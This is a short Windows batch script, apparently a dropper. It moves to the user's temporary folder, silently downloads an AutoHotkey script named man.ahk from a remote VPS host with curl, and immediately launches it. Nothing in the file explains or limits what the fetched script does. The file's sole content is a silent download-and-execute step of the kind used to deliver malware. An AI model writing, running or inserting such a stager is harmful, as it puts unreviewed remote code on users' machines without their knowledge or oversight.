@echo off

cd /d "%TEMP%"
curl -s -O vps.tihkel.ee/win/man.ahk
start "" "man.ahk"
